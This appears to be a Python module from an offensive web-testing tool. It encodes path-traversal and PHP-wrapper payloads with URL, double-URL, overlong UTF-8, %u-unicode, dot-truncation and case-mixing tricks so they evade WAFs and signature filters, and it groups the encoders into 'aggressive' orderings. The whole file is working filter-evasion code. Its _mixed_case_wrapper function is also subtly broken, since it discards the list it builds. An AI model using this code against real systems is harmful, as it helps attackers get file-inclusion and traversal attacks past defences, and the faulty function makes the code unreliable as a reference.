"""
WAF / filter bypass encoders.

Each encoder maps a raw payload string to an obfuscated variant that is often
decoded back to the original by the server-side runtime (PHP, the web server,
or a permissive URL parser) while slipping past naive signature-based filters.
"""
from __future__ import annotations

import urllib.parse
from typing import Callable, Dict, Iterable, List


def _url(text: str) -> str:
    return urllib.parse.quote(text, safe="")


def _double_url(text: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(text, safe=""), safe="")


def _url_slashes_only(text: str) -> str:
    # Encode only path separators and dots — enough to defeat naive "../" regexes.
    return (
        text.replace(".", "%2e")
        .replace("/", "%2f")
        .replace("\\", "%5c")
    )


def _utf8_overlong(text: str) -> str:
    # Overlong UTF-8 for '/' (0x2f) -> %c0%af and '.' (0x2e) -> %c0%ae.
    return text.replace("/", "%c0%af").replace(".", "%c0%ae")


def _sixteen_bit_unicode(text: str) -> str:
    # IIS/.NET style overlong unicode.
    return text.replace("/", "%u2215").replace("\\", "%u2216")


def _dot_truncation(text: str) -> str:
    # Historical path-truncation trick (PHP < 5.3): pad with dots/slashes.
    return text + "." * 8


def _mixed_case_wrapper(text: str) -> str:
    # Wrappers/schemes are case-insensitive in PHP: PhP://FiLTeR ...
    out = []
    for i, ch in enumerate(text):
        out.append(ch.upper() if i % 2 == 0 else ch.lower())
        if text.startswith("php://"):
            break
    if text.startswith("php://"):
        return "PhP://" + text[6:]
    return text


ENCODERS: Dict[str, Callable[[str], str]] = {
    "plain": lambda t: t,
    "url": _url,
    "double_url": _double_url,
    "url_dots_slashes": _url_slashes_only,
    "utf8_overlong": _utf8_overlong,
    "unicode16": _sixteen_bit_unicode,
    "dot_truncation": _dot_truncation,
    "wrapper_case": _mixed_case_wrapper,
}

# Encoders that only make sense for filesystem paths, not wrapper URIs.
_PATH_ONLY = {"utf8_overlong", "unicode16", "dot_truncation", "url_dots_slashes"}


def encode(payload: str, encoder: str) -> str:
    fn = ENCODERS.get(encoder)
    if fn is None:
        raise KeyError(f"unknown encoder: {encoder}")
    return fn(payload)


def variants(payload: str, encoders: Iterable[str], is_path: bool = True) -> List[tuple]:
    """Yield ``(encoder_name, encoded_payload)`` de-duplicated, preserving order."""
    seen = set()
    out: List[tuple] = []
    for name in encoders:
        if not is_path and name in _PATH_ONLY:
            continue
        try:
            enc = encode(payload, name)
        except KeyError:
            continue
        if enc in seen:
            continue
        seen.add(enc)
        out.append((name, enc))
    return out


def default_encoder_order(aggressive: bool = False) -> List[str]:
    base = ["plain", "url", "url_dots_slashes", "double_url"]
    if aggressive:
        base += ["utf8_overlong", "unicode16", "dot_truncation", "wrapper_case"]
    return base
